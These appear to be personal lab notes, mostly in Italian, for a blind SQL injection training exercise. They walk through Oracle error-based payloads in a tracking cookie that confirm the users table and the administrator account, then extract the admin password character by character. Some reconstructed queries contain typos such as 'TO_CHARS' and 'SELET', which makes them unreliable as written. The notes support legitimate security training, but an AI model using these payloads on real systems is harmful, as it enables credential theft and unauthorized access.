This lab contains a blind SQL injection vulnerability.
The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows.
If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called users, with columns called username and password.
You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


QUERY VULNERABILE


SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF';

TrackinId è vulnerabile.

TrackingId = 'mYiB8nC8i7mtDjFF'' =>>> un apice rompe la query
TrackingId = 'mYiB8nC8i7mtDjFF''' =>>> due apici chiudono il secondo "parametro" e la pagina web è caricata senza problemi


1) DETERMINARE STRUTTURA QUERY PER ERRORE CONDIZIONALE

SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF';
' || (SELECT '') || '
= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF' || (SELECT '') || '' ==> Errore perché non è un database mysql o mssql


SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF';
' || (SELECT '' FROM dual) || '
= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF' || (SELECT '' FROM dual) || '';


2) CONFERMARE L'ESISTENZA DELLA TABELLA users

SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF';
' || (SELECT '' FROM users WHERE ROWNUM = 1) || ' ====>>> status 500, tabella esiste
= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF' || (SELECT '' FROM dual WHERE ROWNUM = 1) || '';


3) CONFERMARE L'ESISTENZA DELL'UTENTE administrator

SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF';
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '  ===>> status 500, utente esite
= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF' || (SELECT CASE WHEN (1=1) THEN TO_CHARS(1/0) ELSE '' END FROM users WHERE username='administrator') || '';


4) DETERMINARE LUNGHEZZA PASSWORD ACCOUNT administrator

SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF';
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>1) || ' =====>>>> status 500, password più lunga di...
= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF' || (SELET CASE WHEN (1=1) THEN TO_CHARS(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>1 ||'';


5) ENUMERARE LA PASSWORD DI administrator

SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF';
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a') || ' ====>>>> status 500, carattere è giusto
= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'mYiB8nC8i7mtDjFF' || (SELECT CASE WHEN (1=1) THEN TO_CHARS(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a') || '';